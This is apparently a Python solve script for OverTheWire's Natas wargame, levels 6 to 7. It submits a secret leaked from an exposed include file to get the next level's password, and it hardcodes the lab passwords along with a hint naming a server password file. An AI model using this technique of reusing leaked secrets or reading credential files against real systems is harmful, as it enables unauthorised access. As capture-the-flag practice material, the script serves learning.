#!/usr/bin/env python
#Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
siteUrl = 'http://{}.natas.labs.overthewire.org/'.format(username)

def loginWebSite():
    #content = requests.get(siteUrl, auth = (username, password))
    session = requests.Session()
    response = session.post(siteUrl, data = {"secret":'FOEIUWGHFEEUHOFUOIU', 'submit':'submit'}, auth =(username, password))  #<?$secret = "FOEIUWGHFEEUHOFUOIU";?>
    #content = re.findall('password for (.*)', response)
    print(response.text)
    


def loginNextchallenge():
    
    username = 'natas7'
    password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
    siteUrl = 'http://{}.natas.labs.overthewire.org/'.format(username)

    session = requests.session()
    response = session.post(siteUrl, data = {'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'submit'}, auth = (username, password))
    #content = re.findall(' password for (.*)', response)[0]
    print(response.text)


#loginWebSite()          #Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
loginNextchallenge()    # <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->